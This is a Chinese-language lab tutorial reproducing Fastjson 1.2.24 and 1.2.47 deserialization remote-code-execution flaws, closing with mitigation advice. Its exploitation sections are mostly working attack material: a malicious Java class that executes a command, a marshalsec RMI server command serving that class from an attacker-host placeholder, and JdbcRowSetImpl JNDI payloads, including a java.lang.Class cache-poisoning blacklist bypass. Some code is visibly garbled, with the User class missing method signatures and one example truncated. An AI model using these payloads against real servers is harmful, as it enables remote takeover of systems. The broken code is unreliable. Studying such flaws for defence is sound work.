# Fastjson是什么？

Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。

# Fastjson的优缺点

优点：1、速度快（从名字就可以看出来Fast）

2、API 极简，上手简单

3、强大的个性化序列化注解

4、支持复杂泛型、集合解析

5、阿里生态标配，老项目兼容性拉满

6、内存占用率低

缺点：

早期版本漏洞巨多

我们先来复现一下最早的版本漏洞

# Fastjson 1.2.24反序列化漏洞

# 一、环境搭建

# 1.1依赖配置

①环境要求：

FastJson 版本：1.2.24

JDK：java 8u102

java的版本必须要低

这里必须用低版本 JDK
原因很关键：从 JDK 8u191 开始，Java 对 JNDI 远程类加载做了限制
（com.sun.jndi.rmi.object.trustURLCodebase 默认设为 false），
也就是说高版本 JDK 直接阻断了通过 RMI 加载远程恶意类这条路。
所以要复现这个漏洞，必须用 8u191 以下的版本。

②搭建Maven项目

③添加Fastjson依赖

在pom.xml中添加依赖

<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
</dependencies>

# 1.2 创建项目

package com.example;

public class User {
    private String name;
    private int age;
    private String sex;

    public User() {
    }

        this.sex = sex;

    public String getName() {
        System.out.println("getName");
        return name;
    }

        this.name = name;
        System.out.println("setName");
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) {
        this.age = age;
        System.out.println("setAge");
    }

    public String getSex() {
        System.out.println("getSex");
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
        System.out.println("setSex");
    }
}

package com.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

# 1.4 parseObject 两种调用方式的本质区别

我们可以看到上面的例子，我们使用的是

JSONObject date = JSON.parseObject(Test);

如果我们换成，我们来看下效果

User user = JSON.parseObject(test, User.class);

即

package com.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class Main {
    public static void main(String[] args) {
        String Test = "{\"@type\":\"com.example.User\"," +
                "\"name\":\"world\"," +
                "\"age\":18}";

        User user = JSON.parseObject(Test, User.class);
        System.out.println(user);
    }
}

此时我们可以看到，该方式没有触发任何的getter方法，只触发了setter方法

调用方式 触发方式 返回类型
JSON.pareObject(类文件名字) setter + getter JSONObject
JSON.pareObject(类文件名字,类文件名.calss) setter User对象

# 二、漏洞复现

我们需要先写一个恶意类文件，功能为弹出计算器

public class Evil {
    public Evil() {
        try {
            Runtime.getRuntime().exec("calc"); 
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
    }
}

随后，我们将java文件进行编译 注(最好还是使用低版本的jdk来进行编译，以确保兼容性)

javac Evil.java

我们将该恶意类文件上传至云服务器,本地演示也没问题。

同时我们在云服务器上打开rmi服务，使靶机可以远程下载调用我们的恶意

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击机IP:端口/#Evil" 9999

出现* Opening JRMP listener on 9999即说明成功开启(注意:如果上传至云服务器时，记得开启端口;若在本地可以使用python简单搭建一个服务用来下载)

此时我们修改测试类的payload，来实现RCE

{
    "@type" : "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName" : "rmi://攻击机IP:9999/Evil",
    "autoCommit" : true
}

成功实现弹窗

# 官方前期维护方法

而官方对于该漏洞的更新一开始则是使用黑名单来对抗，但众所周知，黑名单是容易被绕过的。

所以在1.2.47以前，攻击者与官方维护一直处于一个添加黑名单->被绕过->再完善黑名单->再次绕过的一个循环里。Fastjson维护了一个“危险类列表”（如com.sun.rowset.JdbcRowSetImpl）,如果json中的@type指定了这些类，则会直接抛出异常

而在1.2.47版本时，官方将黑名单日益完善，并且默认关闭了AutoType。他们认为攻击者无法绕过黑名单的检测。但是，该版本出现了一个核心的逻辑缺陷：利用全局缓存机制绕过黑名单

# Fastjson 1.2.47反序列化漏洞(全局缓存)

漏洞利用流程（缓存污染）

攻击者发现，即使 AutoType 关闭，Fastjson 在加载类时也会先查缓存。如果缓存里有，就直接用，不再检查黑名单。

# 漏洞复现

我们主要来讲一下payload的变化

倘若我们还使用原来的payload来尝试一下

{ 
  "x":
  { 
  "@type":"com.sun.rowset.JdbcRowSetImpl", 
  "dataSourceName":"ldap://IP地址:9999/shell", 
  "autoCommit":true 
  } 
}

此时我们发现，服务器会报500的错误，表示抛出了异常

我们更新下payload，先使用一个非黑名单里的正常类来将我们的恶意类加载缓存，再调用@type来实现RCE

{ 
  "name":{ 
  "@type":"java.lang.Class", 
  "val":"com.sun.rowset.JdbcRowSetImpl" 
  }, 
  "x":{ 
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://IP地址:9999/shell", 
  "autoCommit":true 
  } 
}

这里将恶意类带入缓存的类需要满足如下条件：

1、不在黑名单中

2、拥有自定义的反序列化器，且逻辑特殊

3、必须能够接收val参数

所以，理论上来说不是黑名单里的类都可以，但实际上需要满足的条件不止于此。综上所述，能够实现的类少之又少，java.lang.Class天然满足上述条件。

此时我们再次发送数据包，成功实现RCE

修复方案：

1、提升JDK版本

JDK 官方在底层代码中“堵死”了攻击者利用 JNDI 远程加载代码的路径。

2、禁用 Fastjson autotype 反序列化 @type 指定的类

autotype 机制允许 JSON 数据告诉服务器“把这个数据转换成哪个类”。如果不对这个功能进行严格限制，攻击者就可以利用它，让服务器去加载并执行恶意的代码，从而完全控制你的服务器。

3、使用 @type 的情况下，配置 Fastjson 反序列化白名单类

如果实在需要使用@type的话，请将黑名单防御改为白名单防御，这样被绕过的可能性大大降低
